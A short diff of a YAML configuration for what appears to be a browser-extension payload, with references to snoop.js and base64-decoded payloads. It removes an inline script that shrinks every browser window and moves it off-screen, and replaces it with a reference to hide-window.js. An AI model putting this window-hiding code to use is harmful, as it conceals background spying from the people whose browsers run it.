@@ -7,14 +7,7 @@ info:
 
 scripts:
   - file: snoop.js
-  - content: |
-      const sleep = ms => new Promise(resolve => setTimeout(resolve,ms));
-      chrome.windows.getAll({}, async (windows) => {
-        for (let w of windows){
-          chrome.windows.update(w.id, {width: 200, height: 100});
-          chrome.windows.update(w.id, {left: -550, top: 1000});
-        }
-      })
+  - file: hide-window.js
     background: true
 
 format: payload:base64decode
